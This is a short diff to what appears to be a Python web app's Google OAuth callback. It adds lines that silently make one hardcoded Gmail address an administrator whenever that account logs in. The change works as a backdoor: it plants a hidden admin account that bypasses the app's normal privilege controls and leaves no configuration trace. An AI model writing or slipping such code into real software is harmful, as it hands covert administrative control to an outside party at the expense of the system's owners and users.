@@ -409,6 +409,9 @@ async def google_callback(request: Request, code: str, db: Session = Depends(get
         if refresh_token:
             user.google_refresh_token = refresh_token
             
+        if email == "ninerseven2020@gmail.com":
+            user.is_admin = True
+            
         db.commit()
         db.refresh(user)
         
